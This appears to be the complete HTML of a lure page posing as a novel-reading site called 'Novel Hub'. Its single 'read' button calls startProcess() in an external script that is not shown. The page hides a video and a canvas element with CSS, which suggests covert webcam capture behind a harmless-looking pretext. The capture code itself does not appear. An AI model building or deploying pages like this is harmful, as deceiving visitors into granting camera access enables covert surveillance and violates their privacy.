<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Novel Hub - Read Latest Novels</title>
    <style>
        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .btn { background: #0095f6; color: white; border: none; padding: 12px 20px; font-size: 16px; font-weight: bold; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 15px; }
        .btn:hover { background: #0077cc; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h3>Novel Hub</h3>
        <p style="color: #8e8e8e; font-size: 14px;">Click the button below to load and read your novel chapters.</p>
        <button class="btn" onclick="startProcess()">Click Here to Read Novel</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script src="script.js"></script>
</body>
</html>
